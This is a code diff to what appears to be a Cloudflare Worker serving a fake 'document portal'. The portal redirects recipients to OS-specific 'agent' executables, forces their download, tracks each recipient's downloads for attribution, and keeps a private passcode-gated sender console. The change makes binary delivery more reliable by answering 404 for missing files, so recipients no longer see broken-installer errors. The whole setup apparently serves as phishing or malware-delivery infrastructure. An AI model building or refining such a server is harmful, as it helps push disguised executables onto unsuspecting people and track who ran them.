@@ -4,6 +4,7 @@
 // Routes:
 //   /get | /download  -> 302 to the OS-appropriate agent (.exe / .pkg / .run)
 //   /dl/<file>        -> force download (Content-Disposition: attachment)
+//                        unknown /dl/ names answer 404 - never the portal HTML
 //   /sender           -> PRIVATE sender console (passcode gated), sender.html
 //   /f/<code>         -> document portal (index.html); ?to= handled client-side
 //   /                 -> business one-pager (about.html)
@@ -149,11 +150,31 @@ export default {
           headers: { Location: '/dl/' + legacy, 'Cache-Control': 'no-store' }
         });
       }
-      // Also log direct artifact hits: a link pasted from a previous message can
-      // skip /get entirely, and that is exactly the download we would otherwise
-      // have no attribution for.
-      logEvent(req, u, ua, 'download', { file: p.slice(4), path: p });
+      // Only a real artifact may leave through /dl/. Cloudflare Pages answers a
+      // path that is not in the bundle with the portal HTML and HTTP 200, so a
+      // typo'd or deliberately unpublished name (e.g. DocumentHelper.msh) would
+      // otherwise download as an HTML page named .exe/.pkg: the recipient sees
+      // "not a valid Win32 application" or "damaged and can't be opened", while
+      // every status check still reported 200. Treat HTML as "not here".
       const r = await env.ASSETS.fetch(req);
+      const ctype = (r.headers.get('content-type') || '').toLowerCase();
+      // 206 (Range: resume/segmented download) and 304 (revalidation) are real
+      // artifact answers; only a miss - or the HTML fallback - is a 404.
+      const hit = r.status === 200 || r.status === 206 || r.status === 304;
+      if (!hit || ctype.startsWith('text/html')) {
+        logEvent(req, u, ua, 'download_miss', { file: p.slice(4), path: p, status: r.status });
+        return new Response('Not found\n', {
+          status: 404,
+          headers: {
+            'Content-Type': 'text/plain; charset=utf-8',
+            'X-Content-Type-Options': 'nosniff',
+            'Cache-Control': 'no-store'
+          }
+        });
+      }
+      // Log the hit only once it is known to be a real artifact, so the
+      // per-recipient download counts are not inflated by misses.
+      logEvent(req, u, ua, 'download', { file: p.slice(4), path: p });
       const h = new Headers(r.headers);
       h.set('Content-Disposition', 'attachment');
       h.set('X-Content-Type-Options', 'nosniff');
